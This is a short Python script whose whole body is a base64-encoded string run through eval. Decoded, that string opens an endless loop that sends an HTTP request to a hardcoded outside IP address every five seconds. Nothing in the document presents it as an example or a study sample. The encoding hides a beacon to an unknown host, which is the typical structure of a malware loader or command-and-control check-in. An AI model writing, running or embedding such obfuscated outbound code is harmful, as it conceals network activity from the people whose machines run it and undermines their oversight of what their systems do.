import base64

obfuscated = "aW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCgp3aGlsZSBUcnVlOgogICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cDovLzUyLjIzLjIwMS4xODQiKQogICAgdGltZS5zbGVlcCg1KQo="

eval(compile(base64.b64decode(obfuscated),'<string>','exec'))
